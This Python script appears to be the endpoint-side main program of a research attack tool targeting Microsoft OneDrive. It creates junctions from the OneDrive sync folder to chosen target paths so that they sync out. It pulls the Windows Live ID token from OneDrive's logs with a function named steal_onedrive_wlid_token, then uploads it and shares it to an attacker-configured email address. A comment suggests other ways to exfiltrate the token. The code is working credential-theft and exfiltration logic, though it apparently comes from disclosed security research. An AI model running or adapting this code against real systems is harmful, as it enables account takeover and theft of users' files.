import os


from config import get_configs, ConfigKey
from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
from doubledrive.endpoint_takeover_utils.reparse_points.reparse_points import create_mount_point
from doubledrive.endpoint_takeover_utils.endpoint_info.onedrive.onedrive_info import get_onedrive_info
from doubledrive.endpoint_takeover_utils.token_extraction.onedrive.onedrive_token_extraction import steal_onedrive_wlid_token


def main():
    onedrive_info = get_onedrive_info()
    configs = get_configs()

    if configs[ConfigKey.SHOULD_CREATE_ONEDRIVE_BINARIES_JUNCTION.value]:
        junctions_names_to_target_paths = configs[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value].copy()
        onedrive_installation_folder_junc_name = configs[ConfigKey.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME.value]
        junctions_names_to_target_paths[onedrive_installation_folder_junc_name] = onedrive_info.version_installation_folder
    else:
       junctions_names_to_target_paths = configs[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value]

    print("Creating junctions to targets")
    for junction_name, target_path in junctions_names_to_target_paths.items():
        junction_path = os.path.join(onedrive_info.sync_folder, junction_name)
        create_mount_point(junction_path, target_path)

    print("Extracting Windows Live ID token from OneDrive's logs")
    windows_live_token = steal_onedrive_wlid_token()
    if None == windows_live_token:
        print("Did not find the WLID token")
        return 1
    onedrive_session = OneDrive()
    onedrive_session.login_using_token(windows_live_token)
    print("Uploading token to OneDrive")
    onedrive_token_file_item = onedrive_session.create_file(f"/{configs[ConfigKey.TOKEN_FILE_NAME.value]}", windows_live_token)
    print("Sending token file to the configured email address using OneDrive API")

    # This function used to send an email to the target email address with a link to access the shared file, even if it was an email
    # address that is not linked to a Microsoft account. Last I checked OneDrive changed some things as a result of this research and
    # for some reason using this API request does not longer sends the email message but only gives access to the Microsoft account
    # that belongs to the target email. It seems like the OneDrive Android app still uses this API even though it partially doesn't work.
    # Regarding the OneDrive's web version, Microsoft changed it to use the Microsoft Graph API instead which is not supported with the
    # WLID token. Therefore, you can choose to exfiltrate the token in other ways or use a target email that has a Microsoft account and
    # access the file by listing files that were shared with this Microsoft account. For testing purposes, you can also of course just
    # print the token and copy it to the attackers machine
    onedrive_session.send_item_to_email(onedrive_token_file_item, configs[ConfigKey.TOKEN_DST_EMAIL_ADDRESS.value])
    


if "__main__" == __name__:
    main()